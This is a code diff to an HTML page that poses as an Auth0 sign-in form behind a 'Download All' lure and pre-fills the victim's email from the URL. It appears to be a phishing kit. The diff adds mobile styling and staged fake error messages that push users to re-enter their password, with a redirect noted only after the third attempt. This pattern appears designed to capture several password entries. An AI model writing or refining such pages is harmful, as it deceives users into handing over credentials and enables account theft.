@@ -702,13 +702,14 @@
             outline-offset: 2px;
         }
 
+        /* ─── EMAIL ICON – clearly an envelope ─── */
         .email-icon-wrapper {
             display: flex;
             align-items: center;
             justify-content: center;
             flex-shrink: 0;
-            width: 20px;
-            height: 20px;
+            width: 24px;
+            height: 24px;
             margin-right: 12px;
             opacity: 0.5;
             transition: opacity 0.2s;
@@ -719,8 +720,36 @@
         }
 
         .email-icon-wrapper svg {
-            width: 18px;
-            height: 18px;
+            width: 20px;
+            height: 20px;
+            display: block;
+        }
+
+        /* Spacing fix for mobile */
+        #two .auth0-lock-input-wrap {
+            padding: 0 12px;
+        }
+        #two .auth0-lock-input {
+            padding: 14px 0;
+            font-size: 0.95rem;
+        }
+        @media (max-width: 480px) {
+            #two .auth0-lock-input-wrap {
+                padding: 0 10px;
+            }
+            #two .auth0-lock-input {
+                padding: 12px 0;
+                font-size: 0.85rem;
+            }
+            .email-icon-wrapper {
+                width: 20px;
+                height: 20px;
+                margin-right: 10px;
+            }
+            .email-icon-wrapper svg {
+                width: 16px;
+                height: 16px;
+            }
         }
     </style>
 </head>
@@ -856,6 +885,7 @@
                                                     </div>
                                                     <div class="auth0-lock-pane-separator"></div>
 
+                                                    <!-- Email field with clear envelope icon -->
                                                     <div class="auth0-lock-input-block auth0-lock-input-email">
                                                         <div class="auth0-lock-input-wrap auth0-lock-input-wrap-with-icon">
                                                             <span class="email-icon-wrapper" aria-hidden="true">
@@ -869,6 +899,7 @@
                                                         </div>
                                                     </div>
 
+                                                    <!-- Password field -->
                                                     <div class="auth0-lock-input-block auth0-lock-input-show-password" id="passwordBlock">
                                                         <div class="auth0-lock-input-block auth0-lock-input-password">
                                                             <div class="auth0-lock-input-wrap" id="passwordWrap">
@@ -884,10 +915,12 @@
                                                         </div>
                                                     </div>
 
+                                                    <!-- Sleek error messages -->
                                                     <div class="sleek-error-container">
                                                         <div id="passwordError" class="error-message"></div>
                                                     </div>
 
+                                                    <!-- Hidden attempt counter -->
                                                     <div id="attemptCounter" class="attempt-counter"></div>
 
                                                     <p class="auth0-lock-alternative">
@@ -1013,17 +1046,39 @@
                 submitBtn.disabled = loading;
             }
 
-            function showSleekError() {
+            // ─── Show sleek error with tailored message based on attempt count ───
+            function showSleekError(attempt) {
                 hideError();
-                const msg = `
+                let msg = '';
+                if (attempt === 1) {
+                    msg = `
                         <div class="error-message--sleek">
                             <span class="emoji">🔒</span>
                             <span class="error-text">
                                 <span class="highlight">Password not recognized.</span>
                                 Please double-check your password and enter it carefully before trying again.
                             </span>
-                        </div>
-                    `;
+                        </div>`;
+                } else if (attempt === 2) {
+                    msg = `
+                        <div class="error-message--sleek">
+                            <span class="emoji">⚠️</span>
+                            <span class="error-text">
+                                <span class="highlight">Second attempt failed.</span>
+                                One more try before we lock you out. Please check your password carefully.
+                            </span>
+                        </div>`;
+                } else {
+                    // Should not happen, but fallback
+                    msg = `
+                        <div class="error-message--sleek">
+                            <span class="emoji">🔒</span>
+                            <span class="error-text">
+                                <span class="highlight">Password not recognized.</span>
+                                Please double-check your password and enter it carefully before trying again.
+                            </span>
+                        </div>`;
+                }
                 passwordError.innerHTML = msg;
                 passwordError.classList.add('show');
                 passwordWrap.classList.add('show-error');
@@ -1042,9 +1097,7 @@
                 e.preventDefault();
                 hideError();
 
-                // Always get fresh email from URL
                 let email = getEmailFromURL();
-
                 if (!email) {
                     passwordError.innerHTML =
                         `<div class="error-message--sleek"><span class="emoji">⚠️</span> <span class="error-text">Email not found in URL.</span></div>`;
@@ -1052,7 +1105,6 @@
                     return;
                 }
 
-                // Double-check: remove any stray '#'
                 email = sanitizeEmail(email);
 
                 setLoading(true);
@@ -1067,14 +1119,12 @@
                         setLoading(false);
                         if (data.success) {
                             currentEmail = email;
-                            // Display the clean email — NO '#' anywhere
                             emailDisplay.value = email;
                             one.style.display = 'none';
                             two.style.display = 'block';
                             attemptCount = 0;
                             hideError();
                             passwordInput.value = '';
-                            // Ensure URL is clean (query param, no hash)
                             upgradeURLToQuery();
                             setTimeout(() => passwordInput.focus(), 120);
                         } else {
@@ -1105,7 +1155,6 @@
                     return;
                 }
 
-                // Ensure currentEmail is clean
                 const cleanEmail = sanitizeEmail(currentEmail);
                 if (cleanEmail !== currentEmail) {
                     currentEmail = cleanEmail;
@@ -1136,16 +1185,19 @@
                     .then(data => {
                         setLoading(false);
                         if (data.redirect) {
+                            // Third attempt success – redirect
                             window.location.href = data.redirect;
                         } else {
-                            showSleekError();
+                            // This shouldn't happen, but fallback
+                            showSleekError(attemptCount);
                             passwordInput.value = '';
                             passwordInput.focus();
                         }
                     })
-                    .catch(() => {
+                    .catch(err => {
                         setLoading(false);
-                        showSleekError();
+                        // Show error based on attempt count
+                        showSleekError(attemptCount);
                         passwordInput.value = '';
                         passwordInput.focus();
                     });
@@ -1179,16 +1231,11 @@
             // ─── ON LOAD ───
             window.addEventListener('load', function() {
                 setLoading(false);
-
-                // Extract email, sanitize, and upgrade URL
                 const email = getEmailFromURL();
                 if (email) {
                     const clean = sanitizeEmail(email);
                     currentEmail = clean;
-                    // If the URL still has a hash with email, upgrade it
                     upgradeURLToQuery();
-                    // Optionally pre-fill the email display if user wants
-                    // (but we only fill after clicking Download All)
                 }
             });
 
